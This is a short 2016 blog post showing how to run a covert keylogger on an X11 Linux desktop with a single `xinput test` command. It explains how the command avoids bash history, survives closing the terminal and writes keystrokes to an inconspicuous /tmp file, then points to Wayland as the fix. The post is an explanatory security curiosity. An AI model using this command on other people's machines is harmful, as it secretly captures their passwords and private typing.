---
layout: post
title:  "A one-line X11 keylogger"
date: 2016-10-16
categories: linux X11 security
---

It's an old adage that you can't secure a computer against people with physical
access to it. I was interested in this idea, so I was exploring what could be done
with only keyboard and mouse access to a typical Ubuntu machine (i.e. without
being able to plug in usb devices or pull out hard drives) when I came across
the `xinput test` command. I'm sure this is old hat to anyone with a real
interest in security, and I'm sure there are plenty of ways to counter it; but I
think it's interesting anyway.

So, here's how to run an X11-based keylogger which writes to a local file and
probably won't be noticed by a non-paranoid user: Open a terminal, run

```
 nohup xinput test $(xinput list | grep 'AT Translated' | sed 's/.*id=\([0-9]*\).*/\1/') > /tmp/tmp.QTQTivXDhI
```

with a leading space character (markdown eats leading spaces in code samples..)
and close the terminal. You may need to change the `AT Translated` to the name
of your keyboard to get it working one your machine, have a look at the output
of `xinput list`. Now press some keys and it will write into
`/tmp/tmp.QTQTivXDhI` something like:

    key press   40
    key press   47
    key release 40
    key press   58
    key press   45
    key release 47
    key release 58
    key release 45
    key press   41
    key press   43
    key release 41
    key press   46
    key release 43
    key press   44
    key release 46
    key press   28
    key release 44
    key press   65
    key release 28
    key release 65

those numbers are X11 keycodes which can be translated to key names if you know
the keyboard layout in use.

Here's a breakdown of the command:

* The leading space tells bash not to record the command in it's history

* `nohup` prevents it from stopping when you close the terminal

* `xinput test` is the command which does the actual keylogging

* `$(...)` finds the id of the keyboard to log

* `> /tmp/tmp/....` writes the output to an inconspicuous looking file

Of course to make any use of this an attacker would need to come back to the
machine and inspect the resulting file, but if someone can get access once they
can probably do it a second time.

I'm not sure that this is a real problem since there are so many other things
that an attacker with this kind of access could do. This is one of many security
issues with X11 that Wayland
[should solve](https://blog.martin-graesslin.com/blog/2015/11/looking-at-the-security-of-plasmawayland/).
